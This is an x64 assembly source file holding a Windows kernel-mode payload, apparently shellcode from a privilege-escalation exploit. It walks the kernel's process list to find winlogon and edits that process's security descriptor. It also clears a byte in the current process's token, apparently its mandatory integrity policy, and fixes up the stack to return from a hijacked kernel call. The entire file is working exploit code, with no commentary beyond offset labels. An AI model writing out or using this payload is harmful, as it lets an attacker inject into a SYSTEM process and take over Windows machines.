KTHREAD_OFFSET        EQU 188h    ; Offset to current KTHREAD from GS
EPROCESS_OFFSET       EQU 0B8h    ; Offset to EPROCESS from KTHREAD
ACTIVEPROCESSLINKS    EQU 448h    ; Offset to ActiveProcessLinks
IMAGEFILENAME_OFFSET  EQU 5A8h    ; Offset to ImageFileName
TOKEN_OFFSET          EQU 4b8h    ; Offset to process token

.code

SAVE_REGS MACRO
    push rax
    push rcx
    push rdx
ENDM

RESTORE_REGS MACRO
    pop rdx
    pop rcx
    pop rax
ENDM

acl_edit PROC
    SAVE_REGS
    xor rax,rax
    mov rax,gs:[rax+KTHREAD_OFFSET]    ; Get current KTHREAD
    mov rax,[rax+EPROCESS_OFFSET]      ; Get current EPROCESS
    mov rcx,rax
__loop:
    mov rax,[rax+ACTIVEPROCESSLINKS]                        ; Get next process
    sub rax,ACTIVEPROCESSLINKS                              ; Adjust to get EPROCESS base
    cmp dword ptr [rax+IMAGEFILENAME_OFFSET],6c6e6977h      ; Compare ImageFileName
    jnz __loop
    sub rax,30h
    add rax,28h
    mov rax, qword ptr [rax]
    and rax,0FFFFFFFFFFFFFFF0h
    add rax,48h
    mov byte ptr [rax],0bh
    mov rdx, qword ptr [rcx+TOKEN_OFFSET]
    and rdx,0FFFFFFFFFFFFFFF0h
    add rdx,0d4h
    mov byte ptr [rdx],0
    RESTORE_REGS
    xor r12,r12
    add rsp,28h
    mov r15, [rsp+88h]
    ret
acl_edit ENDP

END
